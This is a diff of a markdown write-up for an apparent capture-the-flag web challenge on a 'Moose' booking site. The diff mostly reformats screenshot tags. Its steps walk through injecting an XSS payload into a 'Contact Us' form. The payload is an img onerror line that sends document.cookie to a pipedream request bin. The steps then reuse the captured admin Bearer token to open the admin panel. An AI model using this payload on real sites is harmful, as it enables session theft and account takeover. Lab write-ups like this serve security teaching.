@@ -12,29 +12,52 @@ According to her, they noticed several logins to their admin accounts at late ho
 
 
 ## Process:
-<img align="center" src="Images/Booking_01.png"><br>
-Sign up and create an account. The credentials don't matter all that much, just remember them.<br>
-<img align="center" src="Images/Booking_02.png"><br>
+
+<kbd align="center">
+  <img src="Images/Booking_01.png"/>
+</kbd> 
+<br><br>
+Sign up and create an account. The credentials don't matter all that much, just remember them. <br>
+
+<br><kbd align="center">
+  <img src="Images/Booking_02.png"/>
+</kbd><br>
+
 After creating an account, sign in and go to 'My Moose'.<br>
 Scroll down to the 'Contact Us' section.<br>
-<img align="center" src="Images/Booking_03.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_03.png"/>
+</kbd><br><br>
 Go to this site https://pipedream.com/requestbin in order to create a public bin to continue the process<br> 
-<img align="center" src="Images/Booking_04.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_04.png"/>
+</kbd><br><br>
 Copy the endpoint link <br>
-<img align="center" src="Images/Booking_05.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_05.png"/>
+</kbd><br><br>
 Go to this site https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md that contains Reflected XSS injection scripts for stealing cookies and use the 3rd script<br>
-<img align="center" src="Images/Booking_06.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_06.png"/>
+</kbd><br><br>
 In the 'Contact Us' section, place the script with the endpoint link inside of it, for example: <br>
 <img src=x onerror=this.src='https://enqewxf0bhc69.x.pipedream.net/?'+document.cookie;><br>
-<img align="center" src="Images/Booking_07.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_07.png"/>
+</kbd><br><br>
 Now you should return to the public bin page and wait a few moments for the requests to appear. <br>
-<img align="center" src="Images/Booking_08.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_08.png"/>
+</kbd><br><br>
 What you will need now is the Bearer token that is highlighted in the picture. Double click it and copy. <br>
 Return to the Moose site and open up the 'Cookie Editor' extension, and replace the value section with the Bearer token that we just copied. Save it and refresh the page<br>
-<img align="center" src="Images/Booking_09.png"><br>
-<br>
+<br><kbd align="center">
+  <img src="Images/Booking_09.png"/>
+</kbd><br><br>
 Now you should see a new yellow button next to 'My Moose' that says 'Admin Panel'. <br>
-<img align="center" src="Images/Booking_10.png"><br>
+<br><kbd align="center">
+  <img src="Images/Booking_10.png"/>
+</kbd><br><br>
 Now this is the buggy part. Enter the admin panel and you will either see a blank page, or you will see the flag. <br>
 If you don't see the flag, repeat the login part and redo the cookie edit. Repeat until it works
 
